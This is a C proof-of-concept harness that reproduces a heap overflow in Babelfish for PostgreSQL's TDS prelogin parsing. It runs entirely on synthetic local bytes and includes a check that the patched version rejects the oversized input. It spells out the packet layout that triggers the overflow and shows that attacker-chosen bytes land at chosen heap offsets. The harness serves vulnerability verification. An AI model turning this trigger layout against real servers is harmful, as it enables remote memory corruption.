/*
 * Extracted harness for the Babelfish for PostgreSQL TDS prelogin heap
 * overflow: CVE-2026-119923 / GHSA-vq28-vgj3-r26w (CWE-122, Critical 9.8,
 * AV:N/AC:L/PR:N/UI:N).
 *
 * Source-bound transcription (line numbers from exact raw sources in ./src/;
 * see PROVENANCE.md):
 *
 *   babelfish_extensions @ BABEL_4_8_0 (vulnerable)
 *   contrib/babelfishpg_tds/src/backend/tds/tdslogin.c:332-392
 *     ParsePreLoginRequest():
 *       :342-375  read (token, offset, length) triples until 0xFF terminator
 *       :363      initStringInfo(&temp->val)
 *       :377-383  while (prev->next != NULL)
 *                     TdsGetbytes(prev->val.data, prev->length);
 *     PostgreSQL initStringInfo() allocates exactly 1024 bytes
 *     (src/common/stringinfo.c REL_16_STABLE: size = 1024; palloc(size)).
 *     temp->length is a 16-bit network-order field from the wire (max 65535),
 *     never resized or bounded before the copy.
 *
 *   babelfish_extensions @ BABEL_4_10_0 (fixed), commit
 *   ab820bddaffa540af82f2f689c3e535f82f14d89
 *     :367-374  reject length > TDS_DEFAULT_INIT_PACKET_SIZE (4096, tds_int.h:50)
 *     :392-405  resetStringInfo + enlargeStringInfo(&prev->val, prev->length)
 *               then TdsGetbytes; val.len = length; NUL terminate
 *
 *   tdscomm.c:634-659 TdsGetbytes(): memcpy(s, wire, amount) in a loop.
 *   The copied bytes are exactly the sender's packet bytes. Unlike the
 *   GStreamer constant-write finding, the written VALUE here is
 *   sender-chosen -- this is what makes the rung-4 grade meaningful.
 *
 * No PostgreSQL, no Babelfish, no sockets. Bytes are synthesized locally
 * from the same wire field layout. Non-ASan modes back the first StringInfo
 * with a large safe allocation (stamped so OOB offsets are observable) and
 * report OOB relative to the real 1024-byte capacity; the ASan mode uses an
 * exact 1024-byte allocation so the write faults. Buffers leak at exit.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#define SI_INIT_DEFAULT 1024               /* PG stringinfo.c: size = 1024 */
#define TDS_DEFAULT_INIT_PACKET_SIZE 4096  /* babelfish tds_int.h:50 */
#define SAFE_BACKING 8192                  /* > any length used below */

typedef struct
{
    char       *data;
    int         len;
    int         maxlen;
    int         cursor;
} StringInfoData;

typedef struct PreLoginOption
{
    int8_t      token;
    uint16_t    offset;
    uint16_t    length;
    StringInfoData val;
    struct PreLoginOption *next;
} PreLoginOption;

/* ---- synthesized wire input (models TdsRecvBuffer/TdsGetbytes) -------- */
static const unsigned char *g_wire;
static size_t g_wire_len;
static size_t g_wire_pos;

static int
wire_getbytes (char *s, size_t len)
{
    if (g_wire_pos + len > g_wire_len)
        return 1;                     /* EOF / short packet */
    memcpy (s, g_wire + g_wire_pos, len);
    g_wire_pos += len;
    return 0;
}

static void
si_init (StringInfoData *str, int exact)
{
    size_t      bytes = exact ? (size_t) SI_INIT_DEFAULT : (size_t) SAFE_BACKING;

    str->data = (char *) malloc (bytes);
    if (!str->data)
        exit (2);
    memset (str->data, 0xab, bytes);
    str->maxlen = SI_INIT_DEFAULT;
    str->len = 0;
    str->cursor = 0;
    str->data[0] = '\0';
}

/* PostgreSQL enlargeStringInfo: repalloc(newlen + 1), maxlen = newlen. */
static void
si_enlarge (StringInfoData *str, int needed)
{
    char       *p;

    if (needed <= str->maxlen)
        return;
    p = (char *) realloc (str->data, (size_t) needed + 1);
    if (!p)
        exit (2);
    str->data = p;
    str->maxlen = needed;
}

static long
oob_count (size_t written, size_t capacity)
{
    return written > capacity ? (long) (written - capacity) : 0L;
}

/* One option header (token, offset, length, 0xFF terminator), then L payload
 * bytes. The real parser reads all headers first, THEN the payload, so the
 * terminator precedes the payload in the byte stream. */
static void
make_wire (unsigned char *buf, size_t cap, unsigned L,
    unsigned char fill, int stamp_mode)
{
    size_t      p = 0;
    unsigned    i;

    (void) cap;
    buf[p++] = 0x02;                  /* INSTOPT */
    buf[p++] = 0x00;                  /* offset hi */
    buf[p++] = 0x00;                  /* offset lo */
    buf[p++] = (unsigned char) (L >> 8);   /* length hi, network order */
    buf[p++] = (unsigned char) (L & 0xff); /* length lo */
    buf[p++] = 0xff;                  /* terminator; payload follows */
    for (i = 0; i < L; i++)
        buf[p + i] = fill;
    if (stamp_mode)
    {
        static const unsigned char e1[8] =
            { 0xde, 0xad, 0xbe, 0xef, 0xca, 0xfe, 0xba, 0xbe };
        static const unsigned char e2[4] = { 0x41, 0x42, 0x43, 0x44 };
        if (L >= 1108)
            memcpy (buf + p + 1100, e1, sizeof (e1));
        if (L >= 2004)
            memcpy (buf + p + 2000, e2, sizeof (e2));
    }
    p += L;
    g_wire = buf;
    g_wire_len = p;                   /* 6 + L */
    g_wire_pos = 0;
}

/* Vulnerable transcription of tdslogin.c:332-392. first->data is a
 * pre-initialized buffer supplied by the caller. */
static int
vuln_parse_prelogin (StringInfoData *first)
{
    uint16_t    data16;
    PreLoginOption *temp;
    PreLoginOption *prev = NULL;
    PreLoginOption *head = NULL;
    PreLoginOption *opt;
    int         nopts = 0;

    while (1)
    {
        int8_t      tok;

        temp = (PreLoginOption *) calloc (1, sizeof (PreLoginOption));
        if (!temp)
            return 2;
        if (wire_getbytes ((char *) &tok, sizeof (tok)))
            return 1;
        temp->token = tok;
        if (tok == (int8_t) 0xff)
        {
            temp->offset = 0;
            temp->length = 0;
            si_init (&temp->val, 0);  /* terminator option: dummy buffer */
            temp->next = NULL;
            if (prev)
                prev->next = temp;
            break;
        }
        if (wire_getbytes ((char *) &data16, sizeof (data16)))
            return 1;
        temp->offset = (uint16_t) ((data16 >> 8) | (data16 << 8));
        if (wire_getbytes ((char *) &data16, sizeof (data16)))
            return 1;
        data16 = (uint16_t) ((data16 >> 8) | (data16 << 8));
        temp->length = data16;

        /* The first option uses the caller's buffer verbatim: NOT resized
         * after temp->length is parsed (tdslogin.c:363,380). */
        if (nopts == 0)
            temp->val = *first;
        else
            si_init (&temp->val, 0);

        temp->next = NULL;
        if (!prev)
            head = temp;
        else
            prev->next = temp;
        prev = temp;
        nopts++;
    }

    for (opt = head; opt && opt->next; opt = opt->next)
        if (wire_getbytes (opt->val.data, opt->length))
            return 1;
    return 0;
}

/* Fixed transcription: length cap + enlargeStringInfo, per ab820bdd. */
static int
fixed_parse_prelogin (StringInfoData *val, unsigned L)
{
    if (L > TDS_DEFAULT_INIT_PACKET_SIZE)
        return 2;                     /* ereport(FATAL, PROTOCOL_VIOLATION) */
    si_enlarge (val, (int) L);
    if (wire_getbytes (val->data, L))
        return 1;
    val->len = (int) L;
    val->data[val->len] = '\0';
    return 0;
}

static void
hexdump_line (const unsigned char *p, size_t n)
{
    size_t      i;
    for (i = 0; i < n; i++)
        printf ("%s%02x", i ? " " : "", p[i]);
}

/* ---------------- modes ------------------------------------------------ */
static int
mode_rung1 (void)
{
    static unsigned char wire[SAFE_BACKING];
    StringInfoData first;
    unsigned    L = 4096;
    long        oob;

    make_wire (wire, sizeof (wire), L, 0x5a, 0);
    si_init (&first, 0);
    if (vuln_parse_prelogin (&first))
        return 2;
    oob = oob_count (L, (size_t) first.maxlen);
    printf ("rung1 token=0x02 length=%u si_capacity=%d oob_writes=%ld "
        "first_oob=%d last_oob=%u wire_head=", L, first.maxlen, oob,
        SI_INIT_DEFAULT, L - 1);
    hexdump_line (wire, 6);
    printf ("\n");
    printf ("rung1 verdict=%s\n",
        oob == (long) (L - SI_INIT_DEFAULT) ? "TRIGGER" : "MISMATCH");
    return 0;
}

static int
stamp_ok (unsigned char *base, size_t off, const unsigned char *want,
    size_t n)
{
    return memcmp (base + off, want, n) == 0;
}

static int
mode_rung2 (void)
{
    static const unsigned char stamp[8] =
        { 0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11 };
    static unsigned char wire[SAFE_BACKING];
    unsigned    lens[3] = { 1050, 1150, 2100 };
    int         i;

    printf ("rung2 capacity=%d stampA_off=1100 stampB_off=2000\n",
        SI_INIT_DEFAULT);
    for (i = 0; i < 3; i++)
    {
        StringInfoData first;
        unsigned char *base;
        int         a, b;

        make_wire (wire, sizeof (wire), lens[i], 0x5a, 0);
        si_init (&first, 0);
        base = (unsigned char *) first.data;
        memcpy (base + 1100, stamp, sizeof (stamp));
        memcpy (base + 2000, stamp, sizeof (stamp));
        if (vuln_parse_prelogin (&first))
            return 2;
        a = stamp_ok (base, 1100, stamp, sizeof (stamp));
        b = stamp_ok (base, 2000, stamp, sizeof (stamp));
        printf ("rung2 L=%u oob_bytes=%ld stampA_intact=%d stampB_intact=%d\n",
            lens[i], oob_count (lens[i], (size_t) first.maxlen), a, b);
    }
    printf ("rung2 verdict=LENGTH_CONTROL_OBSERVED\n");
    return 0;
}

/* ASan mode: exact 1024-byte allocation, direct copy of wire payload. */
static int
mode_rung3 (void)
{
    static unsigned char wire[SAFE_BACKING];
    StringInfoData first;
    unsigned    L = 4096;

    make_wire (wire, sizeof (wire), L, 0x5a, 0);
    printf ("rung3 length=%u si_capacity=%d (exact allocation)\n", L,
        SI_INIT_DEFAULT);
    fflush (stdout);

    first.data = (char *) malloc (SI_INIT_DEFAULT);
    first.maxlen = SI_INIT_DEFAULT;
    first.len = 0;
    first.cursor = 0;
    if (!first.data)
        return 2;
    first.data[0] = '\0';
    g_wire_pos = 6;                   /* skip 6-byte header+terminator */
    if (wire_getbytes (first.data, L))
        return 2;
    printf ("rung3 UNEXPECTED_NO_FAULT written=%u\n", L);
    return 0;
}

static int
mode_rung4 (void)
{
    static unsigned char wire[SAFE_BACKING];
    StringInfoData first;
    unsigned char *base;
    unsigned    L = 4096;
    static const unsigned char e1[8] =
        { 0xde, 0xad, 0xbe, 0xef, 0xca, 0xfe, 0xba, 0xbe };
    static const unsigned char e2[4] = { 0x41, 0x42, 0x43, 0x44 };

    make_wire (wire, sizeof (wire), L, 0x5a, 1);
    si_init (&first, 0);
    if (vuln_parse_prelogin (&first))
        return 2;
    base = (unsigned char *) first.data;
    printf ("rung4 length=%u si_capacity=%d\n", L, SI_INIT_DEFAULT);
    printf ("rung4 off1100=");
    hexdump_line (base + 1100, sizeof (e1));
    printf (" off2000=");
    hexdump_line (base + 2000, sizeof (e2));
    printf ("\n");
    printf ("rung4 chosen_bytes_written=%d offsets_exact=%d "
        "value_source=wire_packet\n", (int) (sizeof (e1) + sizeof (e2)),
        stamp_ok (base, 1100, e1, sizeof (e1)) &&
        stamp_ok (base, 2000, e2, sizeof (e2)));
    printf ("rung4 verdict=CHOSEN_BYTES_AT_CHOSEN_OFFSETS\n");
    return 0;
}

static int
mode_fixed (void)
{
    static unsigned char wire[SAFE_BACKING];
    StringInfoData val;
    unsigned    L = 4096;
    int         rc;

    make_wire (wire, sizeof (wire), L, 0x5a, 0);
    si_init (&val, 1);                /* exact 1024-byte initStringInfo */
    val.len = 0;
    g_wire_pos = 6;                   /* skip header+terminator */
    rc = fixed_parse_prelogin (&val, L);
    printf ("fixed length=%u reject_over=%d final_cap=%d rc=%d oob_writes=%ld\n",
        L, TDS_DEFAULT_INIT_PACKET_SIZE, val.maxlen, rc,
        oob_count ((size_t) (rc == 0 ? L : 0), (size_t) val.maxlen));
    printf ("fixed verdict=%s\n", (rc == 0 && val.maxlen >= (int) L) ?
        "PASS" : "FAIL");
    return 0;
}


int
main (int argc, char **argv)
{
    const char *mode = argc > 1 ? argv[1] : "rung1";

    if (!strcmp (mode, "rung1"))
        return mode_rung1 ();
    if (!strcmp (mode, "rung2"))
        return mode_rung2 ();
    if (!strcmp (mode, "rung3"))
        return mode_rung3 ();
    if (!strcmp (mode, "rung4"))
        return mode_rung4 ();
    if (!strcmp (mode, "fixed"))
        return mode_fixed ();
    fprintf (stderr, "usage: %s {rung1|rung2|rung3|rung4|fixed}\n", argv[0]);
    return 2;
}
